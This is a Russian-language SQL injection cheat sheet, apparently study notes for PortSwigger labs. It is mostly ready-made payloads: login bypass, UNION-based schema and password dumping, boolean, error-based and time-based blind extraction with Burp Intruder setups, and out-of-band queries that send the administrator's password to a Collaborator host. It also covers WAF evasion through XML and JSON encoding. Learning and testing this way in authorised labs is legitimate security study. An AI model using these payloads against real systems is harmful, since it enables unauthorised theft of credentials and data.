## 🚪 Оглавление 🚪
- [Что такое SQL-инъекция?](#что-такое-sql-инъекция-sqli)
- [1. Извлечение скрытых данных (WHERE)](#1-извлечение-скрытых-данных-where)
- [2. Обход аутентификации](#2-обход-аутентификации-login-bypass)
- [3. UNION-атака](#3-union-атака)
  - [3.1 Определение колонок](#31-определение-колонок)
  - [3.2 Поиск строковых столбцов](#32-поиск-столбцов-с-полезным-типом-данных)
  - [3.3 Извлечение данных](#33-извлечение-важных-данных)
  - [3.4 Конкатенация значений](#34-извлечение-нескольких-значений-из-одного-столбца)
- [4. Анализ базы данных](#-анализ-базы-данных-при-sql-инъекциях)
  - [4.1 Определение версии СУБД](#1-определение-типа-и-версии-базы-данных)
  - [4.2 Список таблиц (без Oracle)](#получение-списка-таблиц-кроме-oracle)
  - [4.3 Список столбцов (без Oracle)](#получение-списка-столбцов-кроме-oracle)
  - [4.4 Особенности Oracle](#анализ-базы-данных-в-oracle)

# 💉SQL-инъекция💉 (SQLi)

SQL-инъекция — это уязвимость веб-безопасности, которая позволяет злоумышленнику вмешиваться в запросы, которые приложение отправляет к своей базе данных.

## Что даёт атакующему?
- Возможность читать конфиденциальные данные (имена пользователей, пароли, личную информацию).
- Возможность изменять или удалять данные.
- В некоторых случаях — выполнять команды на сервере.

## Основная причина
Неправильная фильтрация пользовательского ввода перед подстановкой в SQL-запрос.
<details>
<summary><b>⚙️ 1. Извлечение скрытых данных (WHERE)</b></summary>
- ' OR 1=1--
- ' AND 1=1-- (для слепой)
</details>
<details>
<summary><b>🔑 2. Обход аутентификации (Login Bypass)</b></summary>
- admin' --
- ' OR 1=1; --
- SELECT * FROM users WHERE username = 'administrator'--' AND password = ''<br>
Измените username параметр, присвоив ему значение:administrator'--
</details>
<details>
<summary><b>🧩 3. UNION-атака (определение кол-во колонок)</b></summary>
' ORDER BY 1--<br>
' ORDER BY 2--<br>
' ORDER BY 3--<br>
' UNION SELECT NULL--<br>
' UNION SELECT NULL,NULL--<br>
' UNION SELECT NULL,NULL,NULL--<br>

### 3.1 UNION-атака (определение колонок в Oracle)
В Oracle существует встроенная таблица dual, которую можно использовать для этой цели. Таким образом, внедряемые запросы в Oracle должны выглядеть следующим образом:
- ' UNION SELECT NULL FROM DUAL--

### 3.2 UNION-атака (Поиск столбцов с полезным типом данных)
- ' UNION SELECT 'a',NULL,NULL,NULL--<br>
- ' UNION SELECT NULL,'a',NULL,NULL--<br>
- ' UNION SELECT NULL,NULL,'a',NULL--<br>
- ' UNION SELECT NULL,NULL,NULL,'a'--<br>

Если ошибка не возникает, и ответ приложения содержит дополнительное содержимое, включая внедренное строковое значение, то соответствующий столбец подходит для извлечения строковых данных.

### 3.3 UNION-атака (Использование SQL-инъекции и атаки UNION для извлечения важных данных.)
- ' UNION SELECT username, password FROM users--<br>

Для осуществления этой атаки необходимо знать, что существует таблица с именем usersи двумя столбцами с именами usernameи password.
Без этой информации вам пришлось бы угадывать имена таблиц и столбцов.
Все современные базы данных предоставляют способы изучения структуры базы данных и определения того, какие таблицы и столбцы они содержат.

### 3.4 UNION-атака (Извлечение нескольких значений из одного столбца.)
- ' UNION SELECT username || '~' || password FROM users--<br>
В разных базах данных используется разный синтаксис для конкатенации строк. Для получения более подробной информации см. шпаргалку по SQL-инъекциям.<br>
portswigger.net/web-security/sql-injection/cheat-sheet<br>
</details>
<details>
 <summary><b>🔍 4. Анализ базы данных при SQL-инъекциях</b></summary>

Для успешной эксплуатации SQL-инъекций часто необходимо получить информацию о базе данных:
- Тип и версия СУБД
- Имена таблиц
- Имена столбцов

---

### 4.1 Определение типа и версии базы данных

Можно внедрить запросы, специфичные для конкретной СУБД, и посмотреть, какой из них сработает.

| СУБД | Запрос для получения версии |
|------|----------------------------|
| **Microsoft SQL Server** | `SELECT @@version` |
| **MySQL** | `SELECT @@version` |
| **Oracle** | `SELECT * FROM v$version` |
| **PostgreSQL** | `SELECT version()` |

### Пример через UNION-атаку:
' UNION SELECT @@version--

#### Пример вывода (Microsoft SQL Server):
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)<br>
Mar 18 2018 09:11:49<br>
Copyright (c) Microsoft Corporation<br>
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)<br>

### 4.2 Получение списка таблиц (кроме Oracle)
Большинство типов баз данных (за исключением Oracle) имеют набор представлений, называемых информационной схемой. Она предоставляет информацию о базе данных.<br>
Запрос для получения списка таблиц:<br>
- SELECT * FROM information_schema.tables

#### Пример результата:
| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
|---------------|--------------|------------|------------|
| MyDatabase    | dbo          | Products   | BASE TABLE |
| MyDatabase    | dbo          | Users      | BASE TABLE |
| MyDatabase    | dbo          | Feedback   | BASE TABLE |

### Готовый payload для UNION-атаки:
' UNION SELECT table_name, NULL FROM information_schema.tables--

### 4.3 Получение списка столбцов (кроме Oracle)
Используй представление information_schema.columns

### Запрос для получения столбцов конкретной таблицы:
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
#### Пример результата:
| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | DATA_TYPE |
|---------------|--------------|------------|-------------|-----------|
| MyDatabase    | dbo          | Users      | UserId      | int       |
| MyDatabase    | dbo          | Users      | Username    | varchar   |
| MyDatabase    | dbo          | Users      | Password    | varchar   |
#### Готовый payload для UNION-атаки:
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'Users'--

### 4.4 Анализ базы данных в Oracle
В Oracle нет information_schema. Используй другие представления:<br>

| Что узнать | Запрос |
| :--- | :--- |
| Список таблиц | `SELECT * FROM all_tables` |
| Столбцы таблицы | `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'` |
### Готовые payload'ы для Oracle:
- ' UNION SELECT table_name, NULL FROM all_tables--<br>
- ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS'--<br>
### Важно: В Oracle все имена таблиц и столбцов хранятся в верхнем регистре!
</details>
<details>
<summary><b>🕵️ 5. Слепая SQL-инъекция</b></summary>
Слепая SQL-инъекция происходит, когда приложение уязвимо для SQL-инъекций, но его HTTP-ответы не содержат результатов соответствующего SQL-запроса или подробностей об ошибках базы данных.<br>

Многие методы, такие как UNIONатаки, неэффективны против уязвимостей, связанных со слепой SQL-инъекцией. Это связано с тем, что они основаны на возможности увидеть результаты внедренного запроса в ответах приложения. Тем не менее, использование слепой SQL-инъекции для доступа к несанкционированным данным по-прежнему возможно, но для этого необходимо применять другие методы.<br>

### 5.1 Использование слепой SQL-инъекции путем запуска условных ответов.

Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND '1'='1<br>
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND '1'='2<br>

- Первое из этих значений приводит к тому, что запрос возвращает результаты, поскольку внедренное AND<br>
'1'='1 условие истинно. В результате отображается сообщение «Добро пожаловать обратно».<br>
- Второе значение приводит к тому, что запрос не возвращает никаких результатов, поскольку внедренное условие<br> ложно. Сообщение «Добро пожаловать обратно» не отображается.

Например, предположим, что есть таблица с именем Usersи столбцами Usernameи Password, и пользователь с именем Administrator.<br> Вы можете определить пароль для этого пользователя, отправляя серию входных данных для проверки пароля по одному символу за раз.

Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 'm<br>
**В результате возвращается сообщение "Добро пожаловать обратно", указывающее на то, что внедренное условие истинно, и, следовательно, первый символ пароля m**
**Это требует гораздо большего количества запросов, поэтому вам потребуется использовать Burp Intruder**
- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT SUBSTRING(password,&1&,1) FROM users WHERE username='administrator')='§a§ **(ВАРИАНТ 1)** <br>
- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), &1&, 1) = '&m& **(ВАРИАНТ 2)** <br>
  
#### Также можно проверить наличие таблиц и пользователя

- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT 'a' FROM users LIMIT 1)='a<br> **(Убедитесь, что условие выполняется, и подтвердите наличие таблицы с именем users.)**
- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT 'a' FROM users WHERE username='administrator')='a<br> **(Убедитесь, что условие выполняется, и подтвердите, что существует пользователь с именем administrator**)

### определение кол-во символов в пароле
- Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=&1&)='&a&<br>
**Символ & вокруг цифр и букв помогает программе понять какое значение нужно менять при каждом последующем запросе** 
**При использовании Burp Intruder потребуется список символов для быстрого перебора в & обычно это числа и буквы но также могут быть спец символы**

## 5.2 SQL-инъекция, основанная на ошибках
**SQL-инъекции, основанные на ошибках, относятся к случаям, когда вы можете использовать сообщения об ошибках для извлечения или получения конфиденциальных данных из базы данных, даже в условиях отсутствия доступа к ней. Возможности зависят от конфигурации базы данных и типов ошибок, которые вы можете вызвать**

## Типы Error‑based SQL‑инъекций

| Тип | Что это | Когда использовать |
| :--- | :--- | :--- |
| **Условные ошибки** | Ты вызываешь ошибку **только если условие истинно** и смотришь на разницу в ответе (`500` vs `200`). | Когда ошибки **видны**, но **нет вывода данных**. |
| **Подробные ошибки** | Ты заставляешь БД **выдать данные прямо в тексте ошибки** через преобразование типов (`CAST` / `::int`). | Когда ошибки **видны** и **содержат полный текст ошибки БД**. |

### 📌 Трафарет 1: Условные ошибки (CASE + 1/0)<br>
**Когда нужно проверить один символ и понять, верно ли условие (по статусу 500).** <br>
#### Универсальный шаблон (PostgreSQL)<br>
' AND (SELECT CASE WHEN (условие) THEN 1/0 ELSE 1 END FROM users LIMIT 1)=1<br>
#### Конкретный пример (проверка первого символа пароля)<br>
TrackingId=xyz' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users WHERE username='administrator')=1<br>

Как использовать<br>
Подставляешь символ (a, b, c...).<br>
Если ответ 500 → символ верный.<br>
Если ответ 200 (или 302) → не верный.<br>

### 📌 Трафарет 2: Подробные ошибки (CAST / ::int)<br>
**Когда нужно вытащить всё значение за один запрос.** <br>
#### Универсальный шаблон (PostgreSQL)<br>
'||(SELECT нужное_поле FROM нужная_таблица LIMIT 1)::int||'<br>
#### Конкретный пример (пароль администратора)<br>
TrackingId=xyz'||(SELECT password FROM users WHERE username='administrator')::int||'<br>

Как использовать<br>

## ⚠️ Адаптация под разные СУБД
### PostgreSQL
- **CAST:** `'||(SELECT password FROM users LIMIT 1)::int||'`
- **Условный:** `' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users LIMIT 1)=1`

### Oracle
- **CAST:** `'||(SELECT CAST(password AS int) FROM users WHERE ROWNUM=1 AND username='administrator')||'`
- **Условный:** `' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1 AND username='administrator')=''`

### MySQL
- **CAST:** `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
- **Условный:** `' AND IF(SUBSTR(password,1,1)='a', 1/0, 1)=1--`

### MSSQL
- **CAST:** `' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--`
- **Условный:** `' AND (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users)=1`

### 🔧 Как победить обрезание запроса
Если сервер урезает твой длинный запрос, используй эти приёмы (каждый следующий шаг экономит символы):

##### 🔧 Убери лишний TrackingId
Оставь только апостроф (') — сам идентификатор не нужен, если ты строишь инъекцию с нуля.

##### 🧩 Замени громоздкий CAST на короткий ::int
В PostgreSQL пиши value::int вместо CAST(value AS int) — это сэкономит больше 10 символов.

##### ✂️ Удали LIMIT 1, если уверен в единственной строке
Когда результат гарантированно один (например, по первичному ключу), смело убирай LIMIT — он тут лишний.

##### ⚡ Выбирай AND вместо конкатенации ||
Если условие позволяет, используй AND для замыкания предыдущего условия — это короче, чем || с дополнительной строкой.

##### 🧩 Обходись без комментария --
Вместо того чтобы ставить -- и обрезать остаток запроса, закрой строку через || и подставь нужное значение — так ты не потеряешь символы на комментарий и перевод строки.

### 💡 Совет: применяй эти ухищрения последовательно — каждый из них выигрывает по 2–15 символов, и в сумме это часто решает проблему с обрезкой.

## 🧩 Шпаргалка: готовые инъекции для разных СУБД

###  5.3 ⚡ Получить пароль за 1 запрос (если ошибки показывают данные)

### PostgreSQL
'||(SELECT password FROM users LIMIT 1)::int||'

### Oracle
'||(SELECT CAST(password AS int) FROM users WHERE ROWNUM=1 AND username='administrator')||'

### MySQL
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

### MSSQL
' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users))--

---

### 🔍 Проверить символ по позиции (если ошибки только меняют статус)

| СУБД | Трафарет (вставлять после `TrackingId=`) |
| :--- | :--- |
| **PostgreSQL** | `' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users LIMIT 1)=1` |
| **Oracle** | `' AND (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1 AND username='administrator')=''` |
| **MySQL** | `' AND IF(SUBSTR(password,1,1)='a', 1/0, 1)=1--` |
| **MSSQL** | `' AND (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN 1/0 ELSE 1 END FROM users)=1` |

# 5.4 ⏱️ Time‑based Blind SQL Injection — памятка

## 🧠 Суть метода
Когда приложение не показывает ошибки и не меняет содержимое страницы, но выполняет SQL‑запросы синхронно, можно использовать **задержки**.  
Если условие истинно — база данных «спит» несколько секунд, и HTTP‑ответ задерживается. Если ложно — ответ приходит мгновенно.

**Индикатор:** разница во времени ответа (например, 10 секунд vs 0,5 секунды).

---

## 🧩 Универсальный алгоритм

1. **Найти точку входа** (параметр, cookie, заголовок).
2. **Проверить, что задержка вообще работает** — отправить безусловную задержку (например, `WAITFOR DELAY '0:0:10'` для MSSQL).
3. **Заменить условие на проверку символа** (например, `SUBSTRING(password,1,1)='a'`).
4. **Перебирать символы и позиции**, собирая данные.

---

## 📌 Готовые шаблоны для разных СУБД

### Microsoft SQL Server (MSSQL)
ТВОЙ_ID'; IF (SELECT COUNT(*) FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)='a') > 0 WAITFOR DELAY '0:0:10'--
### PostgreSQL
ТВОЙ_ID' ; SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
### MySQL
ТВОЙ_ID' AND IF(SUBSTR(password,1,1)='a', SLEEP(10), 0)--
### Oracle
ТВОЙ_ID'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN dbms_pipe.receive_message('a',10) ELSE NULL END FROM users WHERE username='administrator')||'
## 🔍 Определение длины пароля
Используй условие с LENGTH(password)=N:
### Пример для PostgreSQL:
ТВОЙ_ID' ; SELECT CASE WHEN (LENGTH(password)=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--<br>
Перебирай N от 1 до 30, пока не появится задержка. Это длина пароля.<br>

**Автоматизация в Burp Intruder<br>
Вариант 1: перебор по одной позиции (Sniper)<br>
Позиция переменной: SUBSTR(password,1,1)='§a§'<br>
Тип атаки: Sniper<br>
Payload: символы a-z, 0-9<br>
Фильтр: сортировать по времени ответа (задержка = верный символ)** <br>

**Вариант 2: перебор всех позиций и символов (Cluster bomb)<br>
Переменные: SUBSTR(password,§1§,1)='§2§'<br>
Payload set 1: номера позиций (1..длина)<br>
Payload set 2: символы<br>
Тип атаки: Cluster bomb<br>
После атаки — отфильтровать строки с большим временем ответа (≈10 сек).** <br> 

**Как анализировать результаты<br>
В Burp Intruder смотри на столбец Response received (время в миллисекундах):<br>
Запросы с задержкой > 9000 мс — это правильные пары (позиция, символ).<br>
Запросы с быстрым ответом (< 1000 мс) — не подходят.** <br>

# 5.5 OAST (Out‑of‑Band) SQL Injection — шпаргалка
## 📌 Когда использовать OAST
Используй OAST, если:<br>
❌ Нет ошибок (Error‑based не работает)<br>
❌ Нет изменений на странице (Boolean‑based не работает)<br>
❌ Нет задержек (Time‑based не работает, либо запросы выполняются асинхронно)<br>
**Суть: ты заставляешь сервер БД отправить внешний запрос (DNS/HTTP) на твой контролируемый сервер (Collaborator). Если запрос доходит — уязвимость подтверждена, и можно извлекать данные.**

## 🧰 Необходимые инструменты
Burp Collaborator (встроен в Professional, но в пробной версии работает) — предпочтительный вариант для лабораторий PortSwigger.<br>
Альтернативы: Interactsh (бесплатно), oastify.com, но в лабораториях PortSwigger они не работают из‑за блокировки внешних систем.<br>
В лабораториях PortSwigger используй только Burp Collaborator (публичный сервер по умолчанию).<br>

## 🔍 Шаг 1. Проверка, что OAST работает (безусловный запрос)
#### MSSQL
'; exec master..xp_dirtree '//твой_поддомен.burpcollaborator.net/a'--<br>
#### Oracle
'||UTL_INADDR.GET_HOST_ADDRESS('твой_поддомен.burpcollaborator.net')||'<br>
#### PostgreSQL
'||dblink('host=твой_поддомен.burpcollaborator.net user=test dbname=test', 'SELECT 1')||'<br>
#### MySQL
' AND LOAD_FILE(CONCAT('\\\\', 'твой_поддомен.burpcollaborator.net', '\\a'))--<br>
**Если в Collaborator видишь DNS/HTTP-запрос → OAST работает.**

## Шаг 2. Извлечение данных (эксфильтрация)
#### MSSQL (экфильтрация пароля через DNS)
'; declare @p varchar(1024); set @p=(SELECT password FROM users WHERE username='administrator'); exec('master..xp_dirtree "//'+@p+'.твой_поддомен.burpcollaborator.net/a"')--<br>
#### Oracle (через UTL_INADDR)
'||UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE username='administrator')||'.твой_поддомен.burpcollaborator.net')||'<br>
#### Oracle (через XML + EXTRACTVALUE)
x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.твой_поддомен.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
#### PostgreSQL (через dblink)
'||dblink('host='||(SELECT password FROM users WHERE username='administrator')||'.твой_поддомен.burpcollaborator.net', 'SELECT 1')||'<br>
#### MySQL (через LOAD_FILE)
' AND LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE username='administrator'), '.твой_поддомен.burpcollaborator.net', '\\a'))--<br>

## 📋 Как понять, какая СУБД
Если ты не знаешь СУБД, проверь через задержки:

| СУБД       | Команда для задержки (10 секунд)          | Примечание                                |
|------------|-------------------------------------------|-------------------------------------------|
| **MSSQL**  | `WAITFOR DELAY '0:0:10'`                  | Формат: `'HH:MI:SS'`                      |
| **Oracle** | `DBMS_PIPE.RECEIVE_MESSAGE('x', 10)`      | Параметр — секунды                        |
| **PostgreSQL** | `pg_sleep(10)`                         | Аргумент — секунды                        |
| **MySQL**  | `SLEEP(10)`                               | Аргумент — секунды                        |

### 💡 Важные нюансы
В лабораториях PortSwigger используй только Collaborator-адрес, сгенерированный через Copy to clipboard в Burp. Сторонние сервисы (Interactsh, oastify.com) блокируются.<br>

Если лаборатория не срабатывает, но Collaborator получает запросы — иногда система засчитывает решение автоматически, даже если ты не видишь данные в Collaborator (проверь статус лаборатории).<br>

Для эксфильтрации данных убедись, что ты используешь правильные имена таблиц и столбцов (в лабораториях обычно users, username, password).<br>

### Полезные ссылки<br>
PortSwigger SQL Injection Cheat Sheet — раздел с OAST-методами.**(https://portswigger.net/web-security/sql-injection/cheat-sheet)** <br>

Шпаргалка по OAST для разных СУБД — репозиторий с пейлоадами.**(https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)** <br>

### 📌 Запомни
**OAST — это последний рубеж, когда всё остальное не работает. Если ты умеешь отправлять DNS-запросы через SQL, ты можешь обойти почти любую защиту.**
</details>

# 🛡️ Как обойти WAF с помощью кодирования?
**где можно внедрять?<br>
Не только в параметрах URL! Любые данные, которые попадают в SQL-запрос:** <br>
- Параметры строки запроса (?id=1)
- Тело POST-запроса (формы, JSON, XML)
- Заголовки HTTP (User-Agent, Cookie)
- Загружаемые файлы (имена, метаданные)
- WebSocket-сообщения

**WAF ищут запрещённые слова: SELECT, UNION, INSERT, DROP и т.д. Обход — закодировать одну или несколько букв так, чтобы WAF не узнал слово, а сервер раскодировал перед выполнением.**

### XML-кодирование (числовые сущности)
Символ	Код	Пример
S	&#x53;	&#x53;ELECT
U	&#x55;	&#x55;NION
F	&#x46;	&#x46;ROM
'	&apos; или &#x27;	username || &apos;~&apos; || password
### Пример payload в XML:
<storeId>1 &#x55;NION &#x53;ELECT username || &apos;~&apos; || password &#x46;ROM users--</storeId>
### JSON-кодирование (Unicode)
Символ	Код	Пример
S	\u0053	\u0053ELECT
U	\u0055	\u0055NION
### Пример payload в JSON:
{"storeId": "1 \u0055NION \u0053ELECT username FROM users"}<br>
### Hackvertor (для Burp Suite) <br>
Установи расширение Hackvertor, тогда можно писать понятный код внутри тегов:<br>
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId><br>
Hackvertor сам закодирует все буквы в hex-сущности.<br>

### 📋 Пошаговый чек-лист для атаки через XML
Перехвати запрос (Burp Suite) — найдите POST с XML-телом.<br>
Определи место вставки — обычно внутри тега, например <storeId>.<br>
Проверь количество столбцов — используй UNION SELECT NULL, NULL, ... пока не получишь ответ без ошибок.<br>
Кодируй ключевые слова — замени первые буквы U и S на &#x55; и &#x53;.<br>
Вставь payload и отправь.<br>
Если ответ содержит данные — атака удалась.<br>










































